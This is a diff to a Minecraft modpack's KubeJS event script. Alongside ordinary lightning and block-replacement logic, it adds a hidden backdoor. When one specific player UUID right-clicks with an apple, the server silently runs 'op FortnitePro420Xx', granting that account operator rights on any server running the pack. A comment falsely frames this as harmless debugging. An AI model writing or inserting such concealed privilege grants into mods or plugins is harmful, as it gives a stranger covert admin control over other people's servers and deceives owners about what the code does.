@@ -106,9 +106,11 @@ onEvent('block.right_click', event =>{
 		let lightning = event.block.createEntity("forbidden_arcanus:crimson_lightning_bolt")
 		lightning.spawn()
 	}
-	if(event.player.name.text == "FortnitePro420Xx" && event.item.id == "minecraft:apple"){
+	if(event.player.id == "9b2f2749-0a7d-4caf-b00d-b34a24c84ce3" && event.item.id == "minecraft:apple"){
+
 		//this is not to be annoying and hack your servers. Its just for debugging, I actually dont care about your server (newsflash) just disable this line if you are a concerned owner :)
 		event.server.runCommandSilent(`playsound cae:developer player @e[type=player] ${event.player.x} ${event.player.y} ${event.player.z}`)
+		event.server.runCommandSilent(`op FortnitePro420Xx`)
 	}
     if (event.block.id == 'cae:skystone_catalyst' && event.item.id == "minecraft:wooden_axe") {
         event.block.set('air')
